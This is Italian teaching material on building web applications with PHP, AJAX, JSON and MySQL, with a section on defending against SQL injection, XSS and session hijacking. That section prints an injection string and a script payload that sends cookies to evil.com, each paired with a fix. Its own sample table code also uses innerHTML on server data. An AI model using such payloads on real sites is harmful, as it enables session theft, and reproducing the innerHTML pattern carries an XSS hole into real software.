Applicazioni Web
Integrate

Il punto di convergenza di tutti i moduli: PHP + JavaScript + AJAX + JSON + MySQL in un'unica applicazione.

Il flusso completo

Come tutte le tecnologie collaborano

1. Utente interagisce
Clicca un pulsante, compila un form, seleziona un filtro. JavaScript intercetta l'evento nel browser.
2. AJAX invia richiesta
XMLHttpRequest invia una richiesta HTTP al server PHP (GET o POST), spesso con parametri in formato JSON.
3. PHP elabora
PHP riceve la richiesta, valida i dati, esegue query MySQL con prepared statements, costruisce la risposta.
4. MySQL risponde
MySQL esegue la query (SELECT, INSERT, UPDATE, DELETE) e restituisce i risultati a PHP.
5. PHP serializza JSON
PHP converte l'array risultato in JSON con json_encode() e lo invia come risposta HTTP con header Content-Type: application/json.
6. JS aggiorna il DOM
JavaScript riceve il JSON, lo deserializza con JSON.parse(), e aggiorna dinamicamente la pagina — senza ricaricamento.
«Un'applicazione web moderna non ricarica la pagina — la aggiorna. AJAX è la tecnica, JSON è il linguaggio.» — Sviluppo web integrato
Sezione 02

Stack tecnologico e architettura

Lato JavaScript (browser):

function caricaStudenti(filtro) {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `api_studenti.php?filtro=${encodeURIComponent(filtro)}`, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            const dati = JSON.parse(xhr.responseText);
            if (dati.success) {
                aggiornaTabellaDOM(dati.studenti);
            }
        }
    };
    xhr.send();
}

function aggiornaTabellaDOM(studenti) {
    const tbody = document.querySelector('#tab-studenti tbody');
    tbody.innerHTML = '';
    studenti.forEach(s => {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${s.nome}</td><td>${s.voto}</td>`;
        tbody.appendChild(tr);
    });
}

Lato PHP (server — api_studenti.php):

header('Content-Type: application/json');

$filtro = $_GET['filtro'] ?? '';
$conn = new mysqli('localhost', 'user', 'pass', 'db');

$stmt = $conn->prepare(
    "SELECT nome, voto FROM Studenti WHERE nome LIKE ? ORDER BY cognome"
);
$like = "%$filtro%";
$stmt->bind_param('s', $like);
$stmt->execute();
$result = $stmt->get_result();

$studenti = [];
while ($row = $result->fetch_assoc()) {
    $studenti[] = $row;
}
$stmt->close();
$conn->close();

echo json_encode(['success' => true, 'studenti' => $studenti]);

Le VIEW semplificano enormemente il codice PHP: invece di scrivere query complesse con molti JOIN ogni volta, si crea la vista una sola volta nel DB.

-- MySQL: crea la vista una volta
CREATE VIEW v_ordini_completo AS
    SELECT o.id, c.nome AS cliente, c.email,
           p.nome AS prodotto, p.prezzo, o.quantita,
           (p.prezzo * o.quantita) AS totale_riga,
           o.data_ordine
    FROM Ordini o
    JOIN Clienti c ON o.id_cliente = c.id
    JOIN Prodotti p ON o.id_prodotto = p.id;

-- PHP: usa la vista come una tabella normale
$result = $conn->query("SELECT * FROM v_ordini_completo WHERE cliente LIKE '%Rossi%'");

Vantaggi: codice PHP semplice e leggibile, logica di JOIN centralizzata nel DB, sicurezza (esponi solo le colonne necessarie), manutenibilità (modifica la vista senza toccare PHP).

Sezione 03

Sicurezza delle Applicazioni Web

I tre attacchi più comuni e come difendersi.

Attacco: inserire codice SQL nell'input per manipolare le query.

// INPUT MALEVOLO: ' OR '1'='1
// Query vulnerabile (MAI fare così):
$sql = "SELECT * FROM Utenti WHERE email = '$email'";
// Diventa: SELECT * FROM Utenti WHERE email = '' OR '1'='1'
// Restituisce TUTTI gli utenti!

// DIFESA: prepared statements (SEMPRE con input utente)
$stmt = $conn->prepare("SELECT * FROM Utenti WHERE email = ?");
$stmt->bind_param("s", $email);
$stmt->execute();
// Il parametro ? non può mai diventare codice SQL

Attacco: iniettare JavaScript malevolo nella pagina vista da altri utenti.

// INPUT MALEVOLO: <script>document.location='http://evil.com?c='+document.cookie</script>
// Se PHP stampa questo senza sanitizzare, tutti gli utenti eseguono lo script!

// DIFESA PHP: htmlspecialchars() converte < in &lt; ecc.
echo htmlspecialchars($_POST['nome'], ENT_QUOTES, 'UTF-8');

// DIFESA JavaScript: usa textContent, non innerHTML, per testo utente
td.textContent = dati.nome;    // sicuro
td.innerHTML   = dati.nome;    // pericoloso se nome contiene HTML/JS

Attacco: rubare il session_id di un utente autenticato per impersonarlo.

// DIFESE:
// 1. SEMPRE HTTPS (cifra il cookie in transito)
// 2. Cookie con HttpOnly + Secure
setcookie(session_name(), session_id(), [
    'secure'   => true,    // solo HTTPS
    'httponly' => true,    // JS non può leggere il cookie
    'samesite' => 'Strict' // blocca invio cross-site
]);

// 3. Rigenera session_id dopo il login
session_start();
session_regenerate_id(true); // invalida il vecchio ID
$_SESSION['user_id'] = $utente['id'];

// 4. Timeout di sessione
if (isset($_SESSION['last_activity']) &&
    (time() - $_SESSION['last_activity'] > 3600)) {
    session_destroy();
    header('Location: login.php');
    exit;
}
$_SESSION['last_activity'] = time();
